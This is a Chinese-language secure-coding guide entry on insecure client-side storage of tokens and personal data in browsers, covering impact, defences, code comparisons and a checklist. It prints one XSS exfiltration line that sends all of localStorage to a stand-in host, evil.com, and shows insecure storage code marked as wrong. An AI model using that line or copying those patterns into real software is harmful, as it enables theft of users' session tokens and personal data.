# 客户端存储敏感数据 (Insecure Client-Side Storage)

> 分类：客户端 / 数据保护 | 风险：中高 | CWE-922 / CWE-539

## 1. 攻击原理

浏览器端的 `localStorage`、`sessionStorage`、`IndexedDB`、Cookie、Cache 都以明文存储且可被同源 JavaScript 读取。一旦发生 XSS，攻击者可直接导出全部数据。同时：

- `localStorage` 无过期机制，数据长期驻留
- 多标签页共享，登出后可能未清理
- 共享设备/公用电脑上残留
- 浏览器扩展、取证工具可读取
- 第三方脚本（广告、分析）也可读取

## 2. 攻击示例

```js
// ❌ 存放长期 Token 与敏感信息
localStorage.setItem('access_token', token);
localStorage.setItem('user', JSON.stringify({ id, email, phone, idCard }));
localStorage.setItem('refresh_token', refreshToken);
```

XSS 一行带走：

```js
fetch('https://evil.com/?d=' + btoa(JSON.stringify(localStorage)));
```

`sessionStorage` 同理，只是生命周期短一些。Cookie 未设 `HttpOnly` 时 `document.cookie` 直接可读。

## 3. 影响

- XSS 后果被放大为「长期账号接管」（refresh token 泄露）
- 个人敏感信息泄露
- 共享设备上他人可读取
- 前端逻辑被篡改（如改 `isVip` 标记）

## 4. 防御措施

1. **认证 Token 优先放 `HttpOnly` Cookie**：JS 不可读，XSS 无法直接窃取（但仍需 CSRF 防护）。
2. **内存存储**：SAP 类应用把 access token 仅存内存（页面刷新即失效，配合静默刷新）。
3. **绝不放 refresh token 到 localStorage**：放 `HttpOnly; Secure; SameSite` Cookie，路径限制到刷新接口。
4. **最小化存储**：只存非敏感的 UI 偏好；不存身份证、卡号、完整手机号。
5. **登出清理**：`localStorage.clear()` / `sessionStorage.clear()`，同时服务端吊销。
6. **敏感数据加密（有限收益）**：WebCrypto 加密只能提高门槛，密钥仍在前端，不能替代服务端控制。
7. **Cookie 加固**：`HttpOnly; Secure; SameSite=Lax; Path=/`，必要时 `__Host-` 前缀。
8. **CSP + 依赖治理**：减少 XSS 面（见 03-xss）。
9. **隐私合规**：按最小必要原则存储，支持用户删除。

## 5. 代码对比

```js
// ❌
localStorage.setItem('token', jwt);
localStorage.setItem('refresh_token', rt);
localStorage.setItem('user', JSON.stringify(profile));

// ✅ 服务端下发 HttpOnly Cookie
res.cookie('__Host-sid', sessionId, {
  httpOnly: true, secure: true, sameSite: 'lax', path: '/',
});
// refresh token 单独 Cookie，限定路径
res.cookie('__Host-rt', refreshToken, {
  httpOnly: true, secure: true, sameSite: 'strict', path: '/auth/refresh',
});

// ✅ 前端只保留内存态
let accessToken = null;
async function refresh() {
  const r = await fetch('/auth/refresh', { method: 'POST', credentials: 'include' });
  accessToken = (await r.json()).accessToken;   // 仅内存
}

// ✅ 只存非敏感偏好
localStorage.setItem('theme', 'dark');
```

```js
// ✅ 登出彻底清理
async function logout() {
  await fetch('/auth/logout', { method: 'POST', credentials: 'include' });
  localStorage.clear();
  sessionStorage.clear();
  indexedDB.deleteDatabase('app');
  location.replace('/login');
}
```

## 6. 自查清单

- [ ] 无 JWT / refresh token 存 localStorage
- [ ] 认证 Cookie 具备 HttpOnly + Secure + SameSite
- [ ] 敏感个人信息不在客户端持久化
- [ ] 登出清理所有客户端存储与服务端会话
- [ ] 第三方脚本无法读取关键数据（隔离/移除）
- [ ] CSP 已启用，XSS 面已收敛
- [ ] 共享设备场景有超时与清理策略

## 7. 参考资料

- OWASP: HTML5 Security Cheat Sheet
- OWASP: Session Management Cheat Sheet
- CWE-922: Insecure Storage of Sensitive Information
- CWE-539: Use of Persistent Cookies Containing Sensitive Information
